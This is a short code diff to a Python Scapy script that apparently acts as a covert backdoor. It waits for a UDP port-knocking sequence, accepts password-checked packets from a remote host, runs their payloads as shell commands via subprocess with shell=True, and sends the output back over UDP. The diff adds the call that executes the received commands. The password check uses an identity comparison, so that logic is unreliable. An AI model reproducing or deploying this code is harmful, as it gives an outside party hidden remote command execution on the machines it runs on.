@@ -50,7 +50,7 @@ def sendPacket(data):
         packet = IP(dst=remoteIP, src=localIP)/UDP(dport=remotePort, sport=localPort)/Raw(load=data)
     send(packet, verbose=True)
 
-def executeCmd(packet, cmd):
+def executeCmd(cmd):
     print("Executing command: {}".format(cmd))
     result = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
     result = result.stdout.read() + result.stderr.read()
@@ -69,6 +69,7 @@ def parsePacket(packet):
 
     if password is not config.password:
         return
+    executeCmd(cmd)
 
 
 def checkRootPrivilege():
@@ -98,7 +99,7 @@ def main():
     mFilter = protocol + " and src host " + remoteIP + " and dst port " + str(localPort) + \
             " and src port " + str(remotePort)
     while code != 3:
-        sniff(filter="udp and dst port {}".format(config.listenPort), prn=portKnocking, count=1)
+        sniff(filter="udp and dst port {}".format(listenPort), prn=portKnocking, count=1)
     while True:
         sniff(lfilter=is_incoming, filter=mFilter, prn=parsePacket, count=1)
 
